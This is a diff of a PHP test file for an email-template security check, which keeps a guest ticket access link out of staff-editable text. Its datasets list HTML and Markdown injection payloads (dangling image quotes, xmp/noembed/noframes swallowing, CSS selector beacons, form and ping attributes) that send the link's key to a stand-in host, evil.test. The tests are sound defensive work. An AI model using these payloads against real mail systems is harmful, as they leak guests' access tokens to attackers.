@@ -10,6 +10,7 @@ use App\Modules\Notifications\Mail\TemplatedMail;
 use App\Modules\Notifications\Models\EmailMessage;
 use App\Modules\Notifications\Models\EmailTemplate;
 use App\Modules\Notifications\Rendering\TemplateEngine;
+use App\Modules\Notifications\Services\EmailComposer;
 use App\Modules\Notifications\Services\MergeContext;
 use App\Modules\Notifications\Services\NotificationMailer;
 use App\Modules\Notifications\Services\RecipientResolver;
@@ -25,14 +26,19 @@ require_once __DIR__.'/helpers.php';
 require_once __DIR__.'/../Support/helpers.php';
 
 /*
- * Security review PR #28, B1 round 3: a SensitiveValue (the guest ticket link) is placed structurally — after
- * Markdown becomes HTML, only as the entire href of an <a>, and on a system-written line in the text part — and is
- * masked everywhere else, whatever the template's text does.
+ * Security review PR #28, B1 (final): staff-editable text never carries an access link, in any template. The guest
+ * ticket link goes out only as the system's own button, added after the mail is built (Markdown, layout, CSS
+ * inlining); staff content in that mail is reduced to an allow-list, and the finished HTML must hold the link
+ * exactly once, as that button's href, to both the HTML5 parser and libxml — otherwise nothing is sent.
  */
 
-const GUEST_URL = 'http://localhost/support/tickets/482913?key=GUESTKEY';
+function guestUrl(): string
+{
+    return url('/support/tickets/482913?key=GUESTKEY');
+}
 
-dataset('nested sensitive links', [
+dataset('staff attempts', [
+    // Round 3: nesting the link inside other markup.
     'inside a Markdown image URL' => ["![p](https://evil.test/p.png?[x]({{ ticket.url }}))\n\nHi"],
     'inside an HTML src' => ["<img src=\"https://evil.test/p.png?[x]({{ ticket.url }})\">\n\nHi"],
     'inside another link\'s URL' => ['Hi [Open](https://evil.test/go?[x]({{ ticket.url }})) there'],
@@ -42,21 +48,43 @@ dataset('nested sensitive links', [
     'in another attribute' => ['<a href="https://evil.test/" title="{{ ticket.url }}">Open</a>'],
     'as a link label' => ['[{{ ticket.url }}]({{ ticket.url }})'],
     'as plain text' => ['Your link: {{ ticket.url }}'],
+    'as a whole link target' => ['[View ticket]({{ ticket.url }})'],
+    // Final check: raw-text elements that libxml parses as markup, to swallow the link into an image URL.
+    'xmp swallow' => ["<xmp><img src='https://evil.test/p.png?</xmp><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
+    'noembed swallow' => ["<noembed><img src='https://evil.test/p.png?</noembed><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
+    'noframes swallow' => ["<noframes><img src='https://evil.test/p.png?</noframes><a href=\"{{ ticket.url }}\">View ticket</a>'>"],
+    'style inside xmp' => ["<xmp><style>a[href*=key]{background:url(https://evil.test/s.png)}</style></xmp>\n\n[View ticket]({{ ticket.url }})"],
+    'Markdown link inside xmp' => ["<xmp><img src='https://evil.test/p.png?</xmp>[View ticket]({{ ticket.url }})'>"],
+]);
+
+dataset('swallowing the system button', [
+    'open image quote' => ["Hi\n\n<img src='https://evil.test/p.png?"],
+    'xmp then open quote' => ["<xmp><img src='https://evil.test/p.png?</xmp>"],
+    'noembed then open quote' => ["<noembed><img src='https://evil.test/p.png?</noembed>"],
+    'noframes then open quote' => ["<noframes><img src='https://evil.test/p.png?</noframes>"],
+    'plaintext' => ["<plaintext><img src='https://evil.test/p.png?"],
+    'textarea' => ["<textarea><img src='https://evil.test/p.png?</textarea>"],
+    'title in body' => ["<p><title><img src='https://evil.test/p.png?</title></p>"],
+    'quote in an attribute name' => ["<p><i a'=\"1\" b=\"<img src='https://evil.test/p.png?\"></i></p>"],
+    'comment dashes' => ["<p><!-- x --!><img src='https://evil.test/p.png? --></p>"],
+    'style selector' => ['<style>a[href*="key="]{background:url(https://evil.test/x.png)}</style>'],
+    'form and ping link' => ['<form action="https://evil.test/f"><button>Go</button></form><a href="http://localhost/x" ping="https://evil.test/ping" onclick="x()">x</a>'],
+    'blank line entities' => ['<p>a&#10;&#10;![x](https://evil.test/x.png?</p>'],
 ]);
 
 /**
  * @return array{0: string, 1: string} [html, text]
  */
-function sendGuestTicketMail(string $body): array
+function sendGuestTicketMail(string $body, string $replyHtml = ''): array
 {
     Mail::fake();
     seedEmailTemplates();
-    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['body' => $body]);
-    $context = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'url' => new SensitiveValue(GUEST_URL, allowedIn: ['ticket.*'])]];
+    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['body' => $body."\n\n".$replyHtml]);
+    $context = ['ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'url' => new SensitiveValue(guestUrl())]];
 
     app(NotificationMailer::class)->send(new EmailRequest('ticket.autoresponse', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|'.md5($body)));
 
-    $parts = [];
+    $parts = ['', ''];
     Mail::assertSent(TemplatedMail::class, function (TemplatedMail $mail) use (&$parts): bool {
         $parts = [(string) $mail->htmlBody, (string) $mail->plainText];
 
@@ -67,94 +95,156 @@ function sendGuestTicketMail(string $body): array
 }
 
 /**
- * Every place the key appears in the HTML must be the whole href of a link: nowhere else, never on another host.
+ * No element (to either parser) has an attribute pointing at the attacker's host or a handler, and no style sheet
+ * mentions it.
  */
-function keyOnlyInLinkHrefs(string $html): bool
+function noForeignMarkup(string $html): bool
 {
-    $document = HTMLDocument::createFromString($html, LIBXML_NOERROR);
-    $inHrefs = 0;
+    $libxml = new DOMDocument;
+    @$libxml->loadHTML('<?xml encoding="UTF-8">'.$html);
 
-    foreach ($document->querySelectorAll('a[href]') as $link) {
-        $href = (string) $link->getAttribute('href');
-        $inHrefs += str_contains($href, 'GUESTKEY') ? 1 : 0;
-
-        if (str_contains($href, 'GUESTKEY') && $href !== GUEST_URL) {
-            return false;
+    foreach ([HTMLDocument::createFromString($html, LIBXML_NOERROR), $libxml] as $document) {
+        foreach ($document->getElementsByTagName('*') as $element) {
+            foreach ($element->attributes as $attribute) {
+                if (str_contains($attribute->value, 'evil.test') || str_starts_with(strtolower($attribute->name), 'on') || strtolower($attribute->name) === 'ping') {
+                    return false;
+                }
+            }
         }
-    }
 
-    return substr_count($html, 'GUESTKEY') === $inHrefs;
-}
-
-/**
- * In the text part the key appears only on a line of its own: "Label: <guest link>".
- */
-function keyOnlyOnOwnLines(string $text): bool
-{
-    foreach (preg_split('/\R/', $text) ?: [] as $line) {
-        if (str_contains($line, 'GUESTKEY') && (! str_ends_with($line, ': '.GUEST_URL) || substr_count($line, 'GUESTKEY') !== 1 || str_contains($line, 'evil.test'))) {
-            return false;
+        foreach ($document->getElementsByTagName('style') as $style) {
+            if (str_contains($style->textContent, 'evil.test')) {
+                return false;
+            }
         }
     }
 
     return true;
 }
 
-it('rejects a nested or misplaced guest link on save', function (string $body) {
+/**
+ * The key appears once in the HTML, as the href of the system button, to the HTML5 parser and to libxml.
+ */
+function keyOnlyInSystemButton(string $html): bool
+{
+    $libxml = new DOMDocument;
+    @$libxml->loadHTML('<?xml encoding="UTF-8">'.$html);
+
+    foreach ([HTMLDocument::createFromString($html, LIBXML_NOERROR), $libxml] as $document) {
+        $hits = 0;
+
+        foreach ($document->getElementsByTagName('*') as $element) {
+            foreach ($element->attributes as $attribute) {
+                if (! str_contains($attribute->value, 'GUESTKEY')) {
+                    continue;
+                }
+
+                if (strtolower($element->localName) !== 'a' || $attribute->name !== 'href' || $attribute->value !== guestUrl() || ! str_contains($element->getAttribute('class'), 'button')) {
+                    return false;
+                }
+
+                $hits++;
+            }
+        }
+
+        if ($hits !== 1 || str_contains($document->documentElement->textContent, 'GUESTKEY')) {
+            return false;
+        }
+    }
+
+    return substr_count($html, 'GUESTKEY') === 1;
+}
+
+it('rejects any use of the guest link in staff text on save', function (string $body) {
     seedEmailTemplates();
 
     expect(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => 'Re: ticket', 'body' => $body]))->toHaveKey('body');
-})->with('nested sensitive links');
+})->with('staff attempts');
 
-it('rejects it over HTTP too', function () {
+it('rejects it in every template and field, over HTTP too', function () {
     seedEmailTemplates();
     actingAsStaff(['notifications.templates.view', 'notifications.templates.manage']);
     confirmPassword();
-    $template = EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole();
+    $template = EmailTemplate::query()->where('key', 'ticket.reply')->sole();
 
     $this->put(route('admin.notifications.templates.update', $template), [
-        'name' => $template->name, 'locale' => 'en', 'subject' => 'We got it',
-        'body' => "We got it.\n\n![](https://evil.test/p.png?[x]({{ ticket.url }}))\n\n[View ticket]({{ ticket.url }})",
+        'name' => $template->name, 'locale' => 'en', 'subject' => 'Reply', 'body' => "We replied.\n\n[View ticket]({{ ticket.url }})",
     ])->assertSessionHasErrors('body');
 
-    expect($template->translations()->where('locale', 'en')->sole()->body)->not->toContain('evil.test');
+    expect(SecretTemplatePolicy::violations('custom.copy', ['subject' => '{{ ticket.url }}', 'body' => 'x']))->toHaveKey('subject')
+        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'x', 'action_label' => 'Open https://evil.test']))->toHaveKey('action_label')
+        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'x', 'action_label' => 'Open ticket {{ ticket.url }}']))->toHaveKey('action_label')
+        ->and(SecretTemplatePolicy::violations('ticket.reply', ['subject' => 'x', 'body' => 'We replied.', 'action_label' => 'Open your ticket']))->toBe([]);
 });
 
-it('accepts the link as a whole link target in the body', function () {
+it('puts the key only in the system button when the template was written to the database directly', function (string $body) {
+    [$html, $text] = sendGuestTicketMail($body);
+
+    expect(keyOnlyInSystemButton($html))->toBeTrue()
+        ->and(noForeignMarkup($html))->toBeTrue()
+        ->and(substr_count($text, 'GUESTKEY'))->toBe(1)
+        ->and($text)->toContain('View your ticket: '.guestUrl());
+})->with('staff attempts');
+
+it('keeps staff markup from swallowing the system button', function (string $body) {
+    [$html, $text] = sendGuestTicketMail($body);
+
+    expect(keyOnlyInSystemButton($html))->toBeTrue()
+        ->and(noForeignMarkup($html))->toBeTrue()
+        ->and(substr_count($text, 'GUESTKEY'))->toBe(1);
+})->with('swallowing the system button');
+
+it('places the button after the body with the editable label, and the default ticket text has no link', function () {
     seedEmailTemplates();
 
-    expect(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => 'Re: ticket', 'body' => "We got it.\n\n[View ticket]({{ ticket.url }})\n\nOr [open it here]({{ ticket.url }})."]))->toBe([])
-        ->and(SecretTemplatePolicy::violations('ticket.autoresponse', ['subject' => '{{ ticket.url }}', 'body' => 'x']))->toHaveKey('subject');
+    foreach (array_keys(SecretTemplatePolicy::SYSTEM_ACTIONS) as $key) {
+        expect(EmailTemplate::query()->where('key', $key)->sole()->translations()->sole())
+            ->body->not->toContain('ticket.url')
+            ->action_label->not->toBeEmpty();
+    }
+
+    EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->translations()->update(['action_label' => 'Open {{ company.name }} ticket']);
+    [$html, $text] = sendGuestTicketMail('We got it.');
+
+    expect($html)->toMatch('#<a href="'.preg_quote(e(guestUrl()), '#').'" class="button"[^>]*>\s*Open .+ ticket\s*</a>#')
+        ->and(strpos($html, 'We got it.'))->toBeLessThan(strpos($html, 'GUESTKEY'))
+        ->and($text)->toMatch('/We got it\.\R+Open .+ ticket: '.preg_quote(guestUrl(), '/').'/');
 });
 
-it('never puts the key anywhere but a link\'s whole href when the template was written to the database directly', function (string $body) {
-    [$html, $text] = sendGuestTicketMail($body."\n\n[View ticket]({{ ticket.url }})");
+it('fails closed when the finished mail would hold the key anywhere else', function () {
+    Mail::fake();
+    seedEmailTemplates();
+    $context = [
+        'ticket' => ['number' => '482913', 'subject' => 'Help', 'department' => 'Support', 'priority' => 'High', 'url' => new SensitiveValue(guestUrl())],
+        'reply' => ['author_name' => 'Sam', 'body_html' => '<p>Your link: '.guestUrl().'</p>', 'excerpt' => ''],
+    ];
 
-    expect(keyOnlyInLinkHrefs($html))->toBeTrue()
-        ->and($html)->toContain('href="'.e(GUEST_URL).'"')
-        ->and(preg_match('/evil\.test[^"\s]*GUESTKEY/', $html))->toBe(0)
-        ->and(keyOnlyOnOwnLines($text))->toBeTrue()
-        ->and($text)->toContain('View ticket: '.GUEST_URL);
-})->with('nested sensitive links');
+    app(NotificationMailer::class)->send(new EmailRequest('ticket.reply', app(RecipientResolver::class)->addresses(['guest@example.test']), $context, 'guest|dup'));
 
-it('drops what could read or forward a revealed link: style sheets, forms, ping and handlers', function () {
-    [$html] = sendGuestTicketMail("<style>a[href*=\"GUESTKEY\"]{background:url(https://evil.test/x.png)}</style>\n\n<form action=\"https://evil.test/f\"><button>Go</button></form>\n\n<a href=\"{{ ticket.url }}\" ping=\"https://evil.test/ping\" onclick=\"x()\">View ticket</a>");
-
-    expect($html)->toContain('href="'.e(GUEST_URL).'"')
-        ->not->toContain('evil.test')
-        ->not->toContain('onclick')
-        ->and(keyOnlyInLinkHrefs($html))->toBeTrue();
+    Mail::assertNothingSent();
+    expect(EmailMessage::query()->sole())->status->value->toBe('failed')
+        ->and(ActivityLog::query()->where('event', 'security')->sole())
+        ->description->toBe('Email blocked: access link placement check failed');
 });
 
-it('moves an inline link onto its own line in the text part', function () {
-    [, $text] = sendGuestTicketMail('Please [open your ticket]({{ ticket.url }}) to reply.');
+it('uses a fresh random token for the system button slot', function () {
+    $tokens = [SecretTemplatePolicy::actionToken(), SecretTemplatePolicy::actionToken()];
 
-    expect($text)->toContain('Please open your ticket to reply.')
-        ->toContain("\nopen your ticket: ".GUEST_URL)
-        ->and(keyOnlyOnOwnLines($text))->toBeTrue();
+    expect($tokens[0])->toMatch('/^zzaction[0-9a-f]{32}zz$/')
+        ->and($tokens[0])->not->toBe($tokens[1]);
 });
 
-it('gets the guest link from Support as a SensitiveValue for ticket mail only, end to end', function () {
+it('checks the finished HTML with both parsers', function () {
+    $button = '<table class="action"><tr><td><a href="'.e(guestUrl()).'" class="button">View</a></td></tr></table>';
+
+    expect(SecretTemplatePolicy::placedOnlyAsSystemButton('<p>Hi</p>'.$button, guestUrl()))->toBeTrue()
+        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton('<p>Hi</p><a href="'.e(guestUrl()).'">View</a>', guestUrl()))->toBeFalse()
+        // HTML5 reads the xmp content as text, libxml as an image whose src holds the button: either way, refused.
+        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton("<xmp><img src='https://evil.test/?</xmp>".$button."'>", guestUrl()))->toBeFalse()
+        ->and(SecretTemplatePolicy::placedOnlyAsSystemButton('<!-- '.guestUrl().' -->'.$button, guestUrl()))->toBeFalse();
+});
+
+it('gets the guest link from Support as a SensitiveValue and mails it only as the system button, end to end', function () {
     Mail::fake();
     seedEmailTemplates();
     EmailTemplate::query()->where('key', 'ticket.autoresponse')->sole()->update(['bcc' => ['archive@example.test']]);
@@ -162,7 +252,7 @@ it('gets the guest link from Support as a SensitiveValue for ticket mail only, e
     $ticket = guestTicket(email: 'gina@example.test');
     $url = data_get(app(MergeContext::class)->ticket($ticket->id), 'ticket.url');
 
-    expect($url)->toBeInstanceOf(SensitiveValue::class)->allowedIn->toBe(['ticket.*']);
+    expect($url)->toBeInstanceOf(SensitiveValue::class)->and($url->value)->toContain('key='.$ticket->access_key);
     Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => $mail->hasTo('gina@example.test')
         && str_contains((string) $mail->htmlBody, 'key='.$ticket->access_key) && $mail->bcc === []);
     expect(EmailMessage::query()->where('template_key', 'ticket.autoresponse')->sole())
@@ -171,15 +261,25 @@ it('gets the guest link from Support as a SensitiveValue for ticket mail only, e
         ->body_text->not->toContain($ticket->access_key);
 });
 
-it('masks a SensitiveValue when cast to a string or JSON, and never allows it in custom or ad-hoc mail', function () {
-    $value = new SensitiveValue('https://localhost/x?key=SECRET', allowedIn: ['ticket.*', 'custom.*', 'adhoc']);
+it('masks a SensitiveValue when cast to a string or JSON', function () {
+    $value = new SensitiveValue('https://localhost/x?key=SECRET');
 
     expect((string) $value)->toBe('••••')
-        ->and(json_encode(['url' => $value], JSON_UNESCAPED_UNICODE))->toBe('{"url":"••••"}')
-        ->and($value->allowedIn('ticket.reply'))->toBeTrue()
-        ->and($value->allowedIn('custom.copy'))->toBeFalse()
-        ->and($value->allowedIn('adhoc'))->toBeFalse()
-        ->and($value->allowedIn('invoice.created'))->toBeFalse();
+        ->and(json_encode(['url' => $value], JSON_UNESCAPED_UNICODE))->toBe('{"url":"••••"}');
+});
+
+it('removes every SensitiveValue from the context of custom and ad-hoc mail', function () {
+    Mail::fake();
+    seedEmailTemplates();
+    $custom = EmailTemplate::factory()->withBody('Copy', '[View]({{ ticket.url }}) {{ ticket.url }}')->create(['key' => 'custom.ticket_copy']);
+    $guest = app(RecipientResolver::class)->addresses(['guest@example.test']);
+    $context = ['ticket' => ['number' => '1', 'url' => new SensitiveValue(guestUrl())]];
+
+    app(NotificationMailer::class)->send(new EmailRequest($custom->key, $guest, $context, 'copy|1'));
+    $adhoc = app(EmailComposer::class)->composeSource('Hi', '[View]({{ ticket.url }})', $context, 'en', templateKey: 'adhoc');
+
+    Mail::assertSent(TemplatedMail::class, fn (TemplatedMail $mail): bool => ! str_contains((string) $mail->htmlBody.$mail->plainText, 'GUESTKEY'));
+    expect($adhoc->html.$adhoc->text)->not->toContain('GUESTKEY');
 });
 
 it('never prints a SensitiveValue from the engine', function () {
